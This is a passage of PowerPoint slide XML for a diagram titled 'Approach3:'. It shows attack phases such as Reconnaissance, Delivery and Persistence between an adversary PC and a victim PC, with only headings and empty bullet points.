        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="51" name="四角形: 角を丸くする 50">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4DEA3846-88FF-44C9-BAD8-874F89766A60}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491462" y="4146186"/>
              <a:ext cx="7825471" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="52" name="グループ化 51">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE1F6F3B-51D6-4047-BC44-691D3727E5D9}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671758" y="4190002"/>
              <a:ext cx="8164958" cy="523220"/>
              <a:chOff x="2671758" y="4190002"/>
              <a:chExt cx="8164958" cy="523220"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="53" name="四角形: 角を丸くする 52">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00D6F48F-4C89-4566-8982-808F2B2E0B62}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671758" y="4254740"/>
                <a:ext cx="1967592" cy="444288"/>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200" dirty="0" err="1">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Persistentence</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="54" name="テキスト ボックス 53">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24E0EDDF-D1E9-4B0F-9D37-E4674A7D6C2A}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4731540" y="4190002"/>
                <a:ext cx="6105176" cy="523220"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="55" name="グループ化 54">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B356C850-D500-4B6F-934E-FDA708D157EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1632607" y="4654253"/>
            <a:ext cx="4784299" cy="646541"/>
            <a:chOff x="2491467" y="2402584"/>
            <a:chExt cx="7943847" cy="646541"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="56" name="四角形: 角を丸くする 55">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F0DDF8C-470C-4F67-A05B-07709E02BA74}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491467" y="2402584"/>
              <a:ext cx="7780901" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="57" name="グループ化 56">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53168D32-9AF4-4E83-B7AC-00B85A44622D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671764" y="2520750"/>
              <a:ext cx="7763550" cy="528375"/>
              <a:chOff x="2671764" y="2520750"/>
              <a:chExt cx="7763550" cy="528375"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="58" name="四角形: 角を丸くする 57">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83F25E00-5139-4C54-B93F-4B5B0FB25CEC}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671764" y="2520750"/>
                <a:ext cx="1967592" cy="444288"/>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1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Delivery</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="59" name="テキスト ボックス 58">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{912BF64E-8F53-40E3-8F37-3D9EA8F9AA1D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4776109" y="2525905"/>
                <a:ext cx="5659205" cy="523220"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:br>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                </a:br>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="矢印: 右 64">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86F81642-675B-4299-A96C-D8B010E3E0E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16704173">
            <a:off x="4216420" y="3608940"/>
            <a:ext cx="4258399" cy="273904"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">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2" name="矢印: 右 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1E9C788-B005-410E-9DA0-6944AC95C6C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3895386" y="3632590"/>
            <a:ext cx="4258399" cy="273904"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">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6" name="矢印: 右 65">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CC54F5E-B2B0-45FF-B502-5E70B6111BDD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="8972627" y="3592358"/>
            <a:ext cx="4258399" cy="273904"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">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198536030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 name="四角形: 角を丸くする 63">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F84F164-B51C-48DE-8866-B963762B669E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="4549258"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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3" name="四角形: 角を丸くする 62">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F294152-A6CE-4600-B182-615C662A69E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="3018330"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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2" name="四角形: 角を丸くする 61">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E89D79B4-3DCA-4877-8F4D-54456BA650A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="1455343"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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1" name="四角形: 角を丸くする 60">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C53EDB0-60AB-4110-814A-3CA3D3E415D6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1537134" y="4565074"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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0" name="四角形: 角を丸くする 59">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BEFF2B5F-A462-4595-ACA7-86BA8E8DB2A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1538161" y="3004765"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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8" name="四角形: 角を丸くする 27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12DAA20C-4E27-4E82-9EDC-874E7D263C87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1537134" y="1432950"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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22" name="グループ化 21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42988117-EB1A-4DE9-B9C7-C66D6313DD55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="328601" y="1320203"/>
            <a:ext cx="2039711" cy="1045029"/>
            <a:chOff x="639988" y="987878"/>
            <a:chExt cx="2039711" cy="1045029"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="21" name="グループ化 20">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6605FE0D-B6A5-4872-B38B-C9420253B64C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="639988" y="987878"/>
              <a:ext cx="1126671" cy="1045029"/>
              <a:chOff x="639988" y="987878"/>
              <a:chExt cx="1126671" cy="1045029"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="9" name="四角形: 角を丸くする 8">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20A5D123-2648-46C4-91C6-7D217A6A2D87}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="639988" y="987878"/>
                <a:ext cx="1126671" cy="759279"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="DB0B0B"/>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二等辺三角形 9">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F55D6590-8BEF-4C54-A519-9C00E9FD11B1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="871310" y="1747157"/>
                <a:ext cx="664027" cy="285750"/>
              </a:xfrm>
              <a:prstGeom prst="triangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="DB0B0B"/>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正方形/長方形 10">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{69DDE372-227B-484F-8C89-C32F9237DC30}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="758369" y="1094618"/>
                <a:ext cx="889907" cy="545798"/>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15" name="テキスト ボックス 14">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A6C198F-BEB5-45E6-A5CE-78DE4CE15F22}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="712107" y="1236712"/>
              <a:ext cx="1967592" cy="261610"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1050" dirty="0" err="1"/>
                <a:t>AdversaryPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1050" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="20" name="グループ化 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A0F568C-FD3E-4960-9019-26D33DA84078}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="10976968" y="5700666"/>
            <a:ext cx="2169661" cy="1045029"/>
            <a:chOff x="8990237" y="5765648"/>
            <a:chExt cx="2169661" cy="1045029"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="19" name="グループ化 18">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0EA675E4-9A30-4BEE-9EF8-B1692957D861}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="8990237" y="5765648"/>
              <a:ext cx="1126671" cy="1045029"/>
              <a:chOff x="8990237" y="5765648"/>
              <a:chExt cx="1126671" cy="1045029"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="12" name="四角形: 角を丸くする 11">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F14B437A-2B0B-44AD-AF71-F1AF5E41D9F2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8990237" y="5765648"/>
                <a:ext cx="1126671" cy="759279"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">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二等辺三角形 12">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{97994570-5827-40E1-8E3D-1C809DD45B31}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="9221561" y="6524927"/>
                <a:ext cx="664027" cy="285750"/>
              </a:xfrm>
              <a:prstGeom prst="triangle">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正方形/長方形 13">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD9F8244-71D9-4198-9904-14600F67E93E}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="9108620" y="5872388"/>
                <a:ext cx="889907" cy="545798"/>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16" name="テキスト ボックス 15">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DA7A626E-6384-42E6-9251-808D681D8E8D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9192306" y="5976862"/>
              <a:ext cx="1967592" cy="261610"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1050" dirty="0" err="1"/>
                <a:t>VictimPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1050" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="矢印: 上向き折線 24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24E84BF4-CB74-48E5-A81A-56A712BF96C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3665917" y="-530763"/>
            <a:ext cx="4431375" cy="10454528"/>
          </a:xfrm>
          <a:prstGeom prst="bentUpArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 11281"/>
              <a:gd name="adj2" fmla="val 10814"/>
              <a:gd name="adj3" fmla="val 35780"/>
            </a:avLst>
          </a:prstGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2">
            <a:schemeClr val="lt1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:lnRef>
          <a:fillRef idx="1">
            <a:schemeClr val="accent1">
              <a:tint val="50000"/>
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:fillRef>
          <a:effectRef idx="0">
            <a:schemeClr val="accent1">
              <a:tint val="50000"/>
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="lt1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:fontRef>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="テキスト ボックス 37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B2DB12C-4E99-452F-9BFE-063F94103C7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354832" y="447479"/>
            <a:ext cx="9691685" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400"/>
              <a:t>Approach3:</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="グループ化 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10752D72-3091-4B56-9267-55205B06D228}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1623624" y="1533875"/>
            <a:ext cx="4686162" cy="761995"/>
            <a:chOff x="2491468" y="1520261"/>
            <a:chExt cx="7780899" cy="761995"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="24" name="四角形: 角を丸くする 23">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{294B98B6-E090-4843-8525-656F7ED7D48B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491468" y="1520261"/>
              <a:ext cx="7780899" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="30" name="四角形: 角を丸くする 29">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B24F1EF-D430-42F2-B552-049B28001865}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2607801" y="1654106"/>
              <a:ext cx="1967592" cy="356263"/>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1100" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Reconnaissance</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="2" name="テキスト ボックス 1">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2DB347B2-3F3C-40C7-9914-B443049E01A5}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4619958" y="1543592"/>
              <a:ext cx="5412921" cy="738664"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
